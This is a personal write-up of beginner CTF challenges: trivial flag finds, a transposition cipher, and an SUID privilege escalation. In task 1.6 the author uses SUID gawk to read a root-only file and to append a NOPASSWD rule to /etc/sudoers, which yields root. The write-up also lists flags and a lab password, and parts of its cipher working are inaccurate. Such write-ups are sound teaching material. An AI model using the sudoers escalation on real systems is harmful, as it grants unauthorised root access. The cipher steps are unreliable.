# Grunnleggende – Beginner Tasks

These are the introductory challenges from the E 2025 CTF. Each task introduces a basic concept.

### 1.1 Scoreboard
#### Learn how to use the `scoreboard` command to view unlocked challenges and submit flags.

Okay, first task. They want us to use the scoreboard command. The LESMEG.md file says:

    Gjør deg kjent med scoreboard-kommandoen. Denne bruker du for å se oversikt over oppgaver du har låst opp og kan løse, sammen med oppgaver du allerede har løst.

The flag is literally... right there in the text. Like, just sitting there. ETJ{e4d8fc322417e82764c82923b9eb4f80}. I feel like this is a trap? But no, it's just the welcome mat.
bash

login@corax ~/1_grunnleggende/1.1_Scoreboard $ scoreboard e4d8fc322417e82764c82923b9eb4f80

And it worked. 
Flagg: ETJ{e4d8fc322417e82764c82923b9eb4f80}
---

### 1.2 Username
#### Learn how to use the `username` command to view or change your display name on the scoreboard website.

Same energy. The LESMEG.md file just hands me the flag:

    Når du føler deg fornøyd kan du levere dette flagget for å fullføre oppgaven: 80d32d56199a49d90fd489d139defd0c

bash

login@corax ~/1_grunnleggende/1.2_Username $ scoreboard 80d32d56199a49d90fd489d139defd0c

The response: "En hacker med et tøft brukernavn er bedre enn en uten." 

Flagg: ETJ{80d32d56199a49d90fd489d139defd0c}
---
### 1.3 FAQ
#### Find a flag hidden on the FAQ page of the CTF website.

Gjør deg kjent med nettsiden! Kanskje finner du flagg?

I click around the FAQ page like a normal person for approximately 3 seconds before my brain goes "just Ctrl+F the page" And there it is, hiding in plain sight.
bash

login@corax ~/1_grunnleggende/1.3_FAQ $ scoreboard d15f097c36751dbc606a9a35940b6987

"Lurt å lese ofte stilte spørsmål!" 

**Flagg**: ETJ{d15f097c36751dbc606a9a35940b6987}

---
### 1.4 Discord
Join the official Discord server and locate the flag in the channel topic of the `#cybertalent` channel.

    Bli med i Discord-serveren!

I join. I scroll. The channel topic for #cybertalent just... has the flag. ETJ{1f2f599e66f73bea747f3959c97bb0d5}. This is less "hacking" and more "being observant," but I'll take it.

Flagg: ETJ{1f2f599e66f73bea747f3959c97bb0d5}
---

### 1.5 Chiffermelding
Connect to a service that gives you an encrypted message. Decode it to find the original text and identify who wrote it.
Okay, now we're actually doing something. Netcat to the service:
bash

login@corax ~/1_grunnleggende/1.5_Chiffermelding $ nc chiffermelding 1337
Her har du en hemmelig melding:
omtfidogiriganøagmremfneohrraeareaenrldrsjekedeg
- Signert av Roscher Lund

Finn ut hva den opprinnelige meldingen var, og fortell meg hvem som skrev den

I stare at this string for way too long. It's Norwegian-looking – lots of ø, æ, å. No weird letters. My first thought is "maybe it's just scrambled?" I try rearranging. Nothing.

Then I remember: sometimes people write text in a grid and read it vertically. AFter many iterative tried i arrived to 16 columns:
text

omt
fid
ogi
rig
anø
agm
rem
fne
ohr
rae
are
aen
rld
rsj
eke
deg

Read vertically... wait. "o f o r a a r r e o r a a r r e d..." This is starting to look like something. Let me actually write it out properly:

Column 1: o f o r a a r f o r a a r r e d
Column 2: m i d i g m e n h a e e l s k e
Column 3: t d g g ø m m e r e n n d j e g

Put them together: "ofor aar f or aar red mig ingen har elsket dig ømmere end jeg"

OH. "O foraar foraar red mig ingen har elsket dig ømmere end jeg." That's actually "O forår, forår, red mig! Ingen har elsket dig ømmere end jeg" – a poem by Henrik Wergeland.
bash

> Henrik Wergeland
55791d3e6f2ffd340b874ebe263ddc04


Flagg: ETJ{55791d3e6f2ffd340b874ebe263ddc04}
---

### 1.6 Unchained
SSH into a machine with a given password. There is a `secret.txt` file that only root can read. Find a way to read it.
SSH in with password EnergiskSkjorte. There's a secret.txt in the home directory that only root can read:
bash

unchained:~$ ls -l
total 4
-rw-------    1 root     root            33 Dec 26 22:29 secret.txt

No sudo. Time to look for SUID binaries:
bash

unchained:~$ find / -type f -perm /u=s 2>/dev/null
/bin/busybox
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/gawk
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/sudo

Busybox drops privileges when I try to use it. But gawk? Let's try:
bash

unchained:~$ gawk '//' "/home/support/secret.txt"
657f1cbfd9e347a0a56557cd52210563

I can then read the file directly with gawk, because gawk has SUID and the file is world-readable. No, it's root:root 600. But gawk runs as root, so it can read it. Simple.

But can I get a root shell? Let's try adding myself to sudoers:
bash

unchained:~$ gawk -v LFILE=/etc/sudoers 'BEGIN { print "support ALL=NOPASSWD: ALL" >> LFILE }'
unchained:~$ sudo su root
/home/support # 

And now I'm root. 

Flagg: ETJ{657f1cbfd9e347a0a56557cd52210563}
---

### 1.7 Innslippsord
Reverse engineer a binary that checks a password. The password is the flag.


---

### 1.8 Kryptogram
Connect to a service that provides a cryptogram. Decrypt it using substitution cipher techniques and extract the code word.

### 1.9 NoSQL
Explore a web‑based flag checker that claims to be protected against SQL injection. Find a way to retrieve the flag without using classic SQLi.

### 1.10 Breakout
SSH into a machine as `user1` and escalate through several users (`user2` → `user6`). Each user’s home directory contains a file with credentials for the next user. The final user has a restricted shell; bypass it to read the flag.

### 1.11 SolveMe
Analyze a C++ binary that asks for four passwords. Each correct password decrypts and prints a part of the flag. There is also a hidden fifth flag somewhere in the binary.

### 1.12 Ubalansert
Connect to an RSA service that gives you `n`, `e`, and the ciphertext. The primes `p` and `q` are poorly chosen; factor `n` to recover the plaintext.

### 1.13 RSA7777
SSH access to a server only allows login with a specific SSH key. You are given the public key. Derive the private key and log in to read the flag.

### 1.14 Apollo
Connect to a server that lets you encrypt arbitrary messages and decrypt ciphertexts, but blocks decryption of the flag. Use a padding oracle attack to recover the flag.
